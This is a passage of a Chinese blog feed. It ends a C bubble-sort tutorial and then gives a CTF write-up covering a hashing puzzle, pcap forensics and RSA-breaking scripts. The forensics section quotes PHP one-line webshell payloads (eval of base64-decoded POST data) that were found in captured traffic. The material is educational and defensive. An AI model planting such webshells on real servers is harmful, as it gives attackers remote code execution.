class="hljs-string">&quot;student.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>);   <span class="hljs-comment">//写方式打开文件 </span><br><span class="hljs-keyword">if</span>(!fp) <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++) <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%s%lf&quot;</span>,&amp;a[i].num,a[i].name,&amp;a[i].sc);<br><span class="hljs-comment">//bubble sort</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;<span class="hljs-number">10</span>;i++)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">10</span>-i;j++)<br>&#123;<br><span class="hljs-keyword">if</span>(a[j].sc&lt;a[j+<span class="hljs-number">1</span>].sc)<br>&#123;<br>t=a[j];a[j]=a[j+<span class="hljs-number">1</span>];a[j+<span class="hljs-number">1</span>]=t;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %s %.2f\n&quot;</span>,a[i].num,a[i].name,a[i].sc);  <span class="hljs-comment">//写到屏幕 </span><br><span class="hljs-built_in">fprintf</span>(fp,<span class="hljs-string">&quot;%d %s %.2f\n&quot;</span>,a[i].num,a[i].name,a[i].sc);<span class="hljs-comment">//写入文件</span><br>&#125;<br>fclose(fp);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>采用的是普通的冒泡</p><p>之前有看到过一篇文章（附上大佬的<a href="https://godyu.com/838.html">链接</a>）</p><p><strong>在数据较大的情况下，冒泡排序的效率并不高，因为它的时间复杂度是O(n^2)，但是在我们又不会其它排序算法的前提下，怎么尽量给它优化一下呢</strong></p><p>如果有像这样的几个数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">arr[<span class="hljs-number">10</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">10</span>,<span class="hljs-number">9</span>&#125;;<br>brr[<span class="hljs-number">10</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">10</span>,<span class="hljs-number">9</span>&#125;;<br></code></pre></td></tr></table></figure><p><strong>那是不是除了后面的那几个，其他的都排序好了呀，但是普通的冒泡排序还会继续比较前面的然后排序，这是不是使程序的效率更不高了，那有没有什么可以优化的地方呢，让我们排完后面的就结束排序呢？当然有的，请看代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 冒泡排序</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bubbleSort</span><span class="hljs-params">(<span class="hljs-type">int</span> arr[], <span class="hljs-type">int</span> n)</span><br>&#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n - <span class="hljs-number">1</span>; i++)<br>  &#123;<br>    <span class="hljs-type">int</span> flag = <span class="hljs-number">1</span>;  <span class="hljs-comment">//定义一个标志</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n - <span class="hljs-number">1</span> - i; j++)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (arr[j] &gt; arr[j + <span class="hljs-number">1</span>])<br>      &#123;<br>        flag = <span class="hljs-number">0</span>;  <span class="hljs-comment">//如果发生则更改标志</span><br>        <span class="hljs-type">int</span> t = arr[j];<br>        arr[j] = arr[j + <span class="hljs-number">1</span>];<br>        arr[j + <span class="hljs-number">1</span>] = t;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (flag == <span class="hljs-number">1</span>)    <span class="hljs-comment">//如果没有发生排序则结束排序</span><br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>相比于普通的冒泡多了一个标志判断，如果前面的已经排好了，并且后面的也排好了，那么整个数组是不是就不会发生交换了呀，所以我们在这个时候就可以轻松愉快结束排序啦~</strong></p><hr><p>因此在写这道文件类型题的时候我们可以这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Student</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> num;<br><span class="hljs-type">char</span> name[<span class="hljs-number">100</span>];<br><span class="hljs-type">double</span> sc;<br>&#125;a[<span class="hljs-number">100</span>],t;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>FILE *fp=fopen(<span class="hljs-string">&quot;student.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-keyword">if</span>(!fp) <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)<br>&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%s%lf&quot;</span>,&amp;a[i].num,&amp;a[i].name,&amp;a[i].sc);<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)<br>&#123;<br><span class="hljs-type">int</span> flag=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">9</span>-i;j++)<br>&#123;<br><span class="hljs-keyword">if</span>(a[j].sc&gt;a[j+<span class="hljs-number">1</span>].sc)<br>&#123;<br>flag=<span class="hljs-number">0</span>;<br>t=a[j];<br>a[j]=a[j+<span class="hljs-number">1</span>];<br>a[j+<span class="hljs-number">1</span>]=t;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(flag==<span class="hljs-number">1</span>)<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %s %.2f\n&quot;</span>,a[i].num,a[i].name,a[i].sc);<br><span class="hljs-built_in">fprintf</span>(fp,<span class="hljs-string">&quot;%d %s %.2f\n&quot;</span>,a[i].num,a[i].name,a[i].sc);<br>&#125;<br>fclose(fp);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>打印出来的结果依然和老师的一样呢！</p>]]></content>
    
    
    <categories>
      
      <category>ACM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C语言</tag>
      
      <tag>小结论</tag>
      
      <tag>ACM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>This is a test article</title>
    <link href="/2024/01/08/This-is-a-test-article/"/>
    <url>/2024/01/08/This-is-a-test-article/</url>
    
    <content type="html"><![CDATA[<p>(づ￣ ³￣)づ这是一篇测试文章</p>]]></content>
    
    
    
    <tags>
      
      <tag>Test</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>YPCTF实验室2023期末招新赛 WP</title>
    <link href="/2024/01/07/YPCTF%E5%AE%9E%E9%AA%8C%E5%AE%A42023%E6%9C%9F%E6%9C%AB%E6%8B%9B%E6%96%B0%E8%B5%9B-WP/"/>
    <url>/2024/01/07/YPCTF%E5%AE%9E%E9%AA%8C%E5%AE%A42023%E6%9C%9F%E6%9C%AB%E6%8B%9B%E6%96%B0%E8%B5%9B-WP/</url>
    
    <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h4 id="✓天才数学家"><a href="#✓天才数学家" class="headerlink" title="✓天才数学家"></a>✓天才数学家</h4><hr><p><strong>跑一下没准就有flag咯</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>([<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(x)])<br><br>n = <span class="hljs-number">26</span><br>x = f(<span class="hljs-number">5</span> ** (<span class="hljs-number">2</span> ** n))<br>flag = <span class="hljs-string">&#x27;ypctf&#123;&#x27;</span> + <span class="hljs-built_in">str</span>(hashlib.md5(<span class="hljs-built_in">str</span>(x).encode()).hexdigest()) + <span class="hljs-string">&#x27;&#125;&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>1.<em>社工题</em></p><p>2.<em>强网杯s7 强网先锋 speedUp</em></p><p>3.<em><a href="https://oeis.org/">https://oeis.org/</a></em></p><p>4.<em>f（x）的作用是计算各个位的数字和 的</em></p><p>5.<em>sha256可以网站在线进行编码</em></p><h6 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h6><p>先了解一下代码的意思</p><ol><li><p><strong>hashlib</strong> 库用于在 Python 中生成哈希值，<code>hashlib.md5()</code> 函数根据传入的数据生成一个 MD5 哈希值。MD5 是一种广泛使用的哈希算法，产生一个128位（16字节）的哈希值，通常用一个32位的十六进制字符串表示。</p></li><li><p><code>f(x)</code> 函数接收一个数字 <code>x</code> 作为参数，将其转换为字符串表示，然后逐个字符地取出字符串中的每个数字，将它们转换为整数后相加，最后返回这些整数的和。</p></li><li><p>变量 <code>n</code> 被赋值为整数 <code>26</code>。</p></li><li><p>接着，<code>x</code> 被赋值为函数 <code>f</code> 应用于 <strong><code>5</code> 的 <code>2</code> 的 <code>n</code> 次方（即 <code>5</code> 的 <code>2 ** 26</code> 次方）</strong>的结果。由于 <code>2 ** 26</code> 是一个非常大的数字，<code>5 ** (2 ** 26)</code> 会是一个极其巨大的数字，远远超出了正常整数范围。</p></li><li><p>然后，计算这个极大数字的每位数字和 <code>x</code>。</p></li><li><p><code>flag</code> 是一个格式化的字符串，它由 ‘ypctf{‘ 开始，然后是 <code>x</code> 的 MD5 哈希值，再跟上一个闭合的大括号 ‘<code>&#125;</code>‘。</p></li><li><p><code>print(flag)</code> 输出这个构造好的字符串。</p></li></ol><p>到目前为止，主要的问题是由于 <code>5 ** (2 ** 26)</code> 的结果是一个非常大的数字，直接计算它可能会导致计算机耗尽内存或者需要很长的处理时间。</p><p>参考 <a href="https://oeis.org/A124307">https://oeis.org/A124307</a> 网站查表可以知道，当n&#x3D;26时函数f为211045936，即<strong>x&#x3D;211045936</strong></p><p>代入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>([<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(x)])<br>x = <span class="hljs-number">211045936</span><br>flag = <span class="hljs-string">&#x27;ypctf&#123;&#x27;</span> + <span class="hljs-built_in">str</span>(hashlib.md5(<span class="hljs-built_in">str</span>(x).encode()).hexdigest()) + <span class="hljs-string">&#x27;&#125;&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p><strong>ypctf{eed6e4abf257341bb6e477869fc68ced}</strong></p><h4 id="✓木马"><a href="#✓木马" class="headerlink" title="✓木马~~~"></a>✓木马~~~</h4><hr><p>确认黑客成功登录网站后写入的第一木马的密码，将他作为flag提交,格式:flag{xxx}</p><h6 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h6><p>参考<a href="http://t.csdnimg.cn/DqhBy%E7%9A%84%E9%A2%98%E7%9B%AE%E4%BA%8C">http://t.csdnimg.cn/DqhBy的题目二</a></p><p>题目说<strong>黑客成功登录网站后写入的第一木马的密码</strong>所以了解了下php<strong>一句话木马</strong>大概是什么</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Form item: <span class="hljs-string">&quot;zzz&quot;</span> = <span class="hljs-string">&quot;@eval(base64_decode(<span class="hljs-subst">$_POST</span>[z0]));&quot;</span><br></code></pre></td></tr></table></figure><p>字段中<strong>zzz</strong>就是一句话木马密码</p><p>所以在Wireshark中直接查找了 <strong>@eval</strong></p><p>发现了两个php木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Form item: <span class="hljs-string">&quot;sdnisc&quot;</span> = <span class="hljs-string">&quot;@eval(base64_decode(<span class="hljs-subst">$_POST</span>[z0]));&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Form item: <span class="hljs-string">&quot;niubibi666&quot;</span> = <span class="hljs-string">&quot;@eval(@base64_decode(<span class="hljs-subst">$_POST</span>[&#x27;l0a98b02d52bee&#x27;]));&quot;</span><br></code></pre></td></tr></table></figure><p>最终成功提交flag</p><p><strong>flag{niubibi666}</strong></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h4 id="✓babyRSA"><a href="#✓babyRSA" class="headerlink" title="✓babyRSA"></a>✓babyRSA</h4><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, getPrime<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">step1</span>(<span class="hljs-params">m</span>):<br>    q = getPrime(<span class="hljs-number">265</span>)<br>    p = getPrime(<span class="hljs-number">265</span>)<br>    r = getPrime(<span class="hljs-number">512</span>)<br>    e = <span class="hljs-number">65537</span><br>    c = <span class="hljs-built_in">pow</span>(m, e, p * q * r)<br>    <span class="hljs-keyword">return</span> r, c<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">step2</span>(<span class="hljs-params">m</span>):<br>    q = getPrime(<span class="hljs-number">512</span>)<br>    p = getPrime(<span class="hljs-number">512</span>)<br>    e = <span class="hljs-number">3</span><br>    c = <span class="hljs-built_in">pow</span>(m, e, p*q)<br>    <span class="hljs-keyword">return</span> c<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    flag = [<span class="hljs-string">b&#x27;ypctf&#123;xxxxxxx&#x27;</span>, <span class="hljs-string">b&#x27;xxxxxx&#125;&#x27;</span>]<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag) == <span class="hljs-number">2</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;step1:&quot;</span>)<br>    r, c1 = step1(bytes_to_long(flag[<span class="hljs-number">0</span>]))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;r = <span class="hljs-subst">&#123;r&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c1 = <span class="hljs-subst">&#123;c1&#125;</span>&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;step2:&quot;</span>)<br>    c2 = step2(bytes_to_long(flag[<span class="hljs-number">1</span>]))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c2 = <span class="hljs-subst">&#123;c2&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><span class="hljs-comment"># step1:</span><br><span class="hljs-comment"># r = 10200813482499903015574167175255120269899185526333710616983589908620440125577620092919918912319621198681902425151609040317682320198705097977896085425285731</span><br><span class="hljs-comment"># c1 = 11124277809082103926544419587303148261704680981866367174531564351229269451359617032612545393187566764767549271037306158405850426664158499896720035326443741076595207218587112361586007032820275170362317744987708656621681654615849993147344866107156840731498533688346954767525456786577205732779710774241217639657901586</span><br><span class="hljs-comment"># step2:</span><br><span class="hljs-comment"># c2 = 394825611979318618153157664109977339304086089427736453642881370060650762308320957553384257416607342610350788759511462749891671445236506732235365025893</span><br></code></pre></td></tr></table></figure><h6 id="WP-2"><a href="#WP-2" class="headerlink" title="WP"></a>WP</h6><p>flag[0]</p><p>脚本参考自<a href="http://t.csdnimg.cn/K7w98">http://t.csdnimg.cn/K7w98</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br> <br>e = <span class="hljs-number">65537</span><br><span class="hljs-comment"># p = getPrime(265)</span><br><span class="hljs-comment"># q = getPrime(265)</span><br>r = <span class="hljs-number">10200813482499903015574167175255120269899185526333710616983589908620440125577620092919918912319621198681902425151609040317682320198705097977896085425285731</span><br><span class="hljs-comment"># n = p*q</span><br>c = <span class="hljs-number">11124277809082103926544419587303148261704680981866367174531564351229269451359617032612545393187566764767549271037306158405850426664158499896720035326443741076595207218587112361586007032820275170362317744987708656621681654615849993147344866107156840731498533688346954767525456786577205732779710774241217639657901586</span><br>d= gmpy2.invert(e,r*(r-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c,d,r)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>输出<strong>ypctf{dbaa1dd2-fcda-4a</strong></p><p>flag[1]</p><p>低加密指数攻击（e很小）</p><p>脚本参考自<a href="http://t.csdnimg.cn/DXRhd">http://t.csdnimg.cn/DXRhd</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">de</span>(<span class="hljs-params">c, e, n</span>):<br>    k = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        m = c + n*k<br>        result, flag = gmpy2.iroot(m, e)<br>        <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> == flag:<br>            <span class="hljs-keyword">return</span> result<br>        k += <span class="hljs-number">1</span><br><br>e = <span class="hljs-number">3</span><br>q = getPrime(<span class="hljs-number">265</span>)<br>p = getPrime(<span class="hljs-number">265</span>)<br>n = p * q<br>c = <span class="hljs-number">394825611979318618153157664109977339304086089427736453642881370060650762308320957553384257416607342610350788759511462749891671445236506732235365025893</span><br><br>m=de(c,e,n)<br><span class="hljs-comment">#print(m)</span><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>输出<strong>22-9c68-db0168730d2a}</strong></p><p><strong>ypctf{dbaa1dd2-fcda-4a22-9c68-db0168730d2a}</strong></p><h4 id="✓Sign-in-RSA"><a href="#✓Sign-in-RSA" class="headerlink" title="✓Sign-in-RSA"></a>✓Sign-in-RSA</h4><hr><p><strong>好像是最基础的RSA？</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime,inverse<br><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> s2n<br>flag = <span class="hljs-string">b&#x27;ypctf&#123;xxxxxx&#125;&#x27;</span><br><br>e = <span class="hljs-number">65537</span><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p*q<br>d = inverse(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>c = <span class="hljs-built_in">pow</span>(s2n(flag),e,n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;p&#125;</span><span class="hljs-subst">&#123;q&#125;</span><span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-comment"># 1568269095014051046543772675020533753679782725295670368494912688666494081221520319891651149524375521951393957144167070290919523715514797490534978587216022020717011509433659585973840552008945411823138899307281500675077711438883230906033302545921313697594272585899303380281287599330618168047945995607373958770531336441555862764961334792786102871495597347521268719149104296615968740540953908789966285856669227844235544674763980444378396245738045041388864320336635989075826926934223534630892953255090503354849684415378999617803236576251028220576687944219075292126013045274870162549175772651429217707735637272667579430590519536017452836823429645826694319617486480879724151833083388160906357097882078813889197589834615405031960702058739686929736473570908163824972756174558271365678528679593177698408395532314573375982445946431971584552350683472814845598485034753643394810924803600381602924896234385163090002316373276983126797430928877801254619452365114661033058600512794706038142715521730698662028627991302174210099755641140058583698528230781794294721147587725360918410437163205167991442509005829618278503610152474625563075772858851588385730204096646202899360974892611502857147262915518122104421856877446272725814428346794856294309868667129</span><br></code></pre></td></tr></table></figure><p><em>p&#x3D;1568269095014051046543772675020533753…..60737395877053</em></p><p><em>q&#x3D;1336441555862764961334792786102871495597347521268719149104296615968740540953908789966285856669227844235544674763980444378396245738045041388864320336635989075826926934223534630892953255090503354849684415378999617803236576251028220576687944219075…..3059051</em></p><ul><li><code>pow(a, b, c)</code>：是Python内置函数，用于计算<code>a</code>的<code>b</code>次幂，并取模<code>c</code>的结果，即计算 <code>a^b mod c</code>。在这个上下文中，<code>a</code>是<code>s2n(flag)</code>的结果，<code>b</code>是公钥指数<code>e</code>，<code>c</code>是模数<code>n</code>。</li></ul><h6 id="WP-3"><a href="#WP-3" class="headerlink" title="WP"></a>WP</h6><p>先了解一下代码的意思</p><ol><li><code>Crypto.Util.number</code> 是一组加密函数，主要用于生成大的素数和其他数学操作， <strong><code>getPrime</code> 函数用于生成指定位数的随机素数</strong> 。</li><li><strong><code>libnum.s2n</code> 函数（可能来自于第三方<code>libnum</code>库）用于将字符串转换成一个数字</strong>，因为 RSA 加密是在数学层面上进行的，所以我们需要将要加密的数据（本例中的<code>flag</code>）转换为一个数值。</li><li><code>e</code> 是公钥的一个部分，称为公钥指数。在 RSA 中，<code>e</code> 常被选为一个小的素数，其中 65537 是常用的值，因为它既安全又可以高效处理。</li><li><code>p</code> 和 <code>q</code> 都是随机生成的 1024 位素数，这俩素数的大小是保障 RSA 密钥强度的重要因素。</li><li><code>n</code> 是 <code>p</code> 和 <code>q</code> 的乘积，构成了公钥的另一部分。任何人都可以知晓 <code>n</code> 和 <code>e</code>，他们组合起来构成公钥。</li><li><code>d</code> 是私钥指数，使用扩展欧几里得算法（通过<code>inverse</code>函数）计算得出。它需要满足 <code>(e*d) % ((p-1)*(q-1)) == 1</code> 这个条件，这里 <code>(p-1)*(q-1)</code> 是 φ(n)，即 n 的欧拉函数值。</li><li><code>c</code> 是将 <code>flag</code> 使用公钥 <code>(e, n)</code> 加密后的密文。利用<code>pow</code>函数和公式 <code>c = m^e mod n</code> 来计算，其中 <code>m</code> 是转换为数字后的 <code>flag</code>， <code>c</code> 是加密后的结果。</li></ol><p>最后，这段代码打印出 <code>p</code>、<code>q</code> 和 <code>c</code> 所组合的字符串。然而需要注意的是，打印出的并不是 <code>p</code> 和 <code>q</code> 之间的任何分隔符，因此直接从输出中分辨出两个素数可能会有困难。</p><p>而提示已经给了p，q的大概和代码输出的值，我们就可以知道以下值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p=<span class="hljs-number">156826909501405104654377267502053375367978272529567036849491268866649408122152031989165114952437552195139395714416707029091952371551479749053497858721602202071701150943365958597384055200894541182313889930728150067507771143888323090603330254592131369759427258589930338028128759933061816804794599560737395877053</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">q=<span class="hljs-number">133644155586276496133479278610287149559734752126871914910429661596874054095390878996628585666922784423554467476398044437839624573804504138886432033663598907582692693422353463089295325509050335484968441537899961780323657625102822057668794421907529212601304527487016254917577265142921770773563727266757943059051</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">c=<span class="hljs-number">9536017452836823429645826694319617486480879724151833083388160906357097882078813889197589834615405031960702058739686929736473570908163824972756174558271365678528679593177698408395532314573375982445946431971584552350683472814845598485034753643394810924803600381602924896234385163090002316373276983126797430928877801254619452365114661033058600512794706038142715521730698662028627991302174210099755641140058583698528230781794294721147587725360918410437163205167991442509005829618278503610152474625563075772858851588385730204096646202899360974892611502857147262915518122104421856877446272725814428346794856294309868667129</span><br></code></pre></td></tr></table></figure><p>已经知道<strong>p，q，e，c</strong>用脚本直接跑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 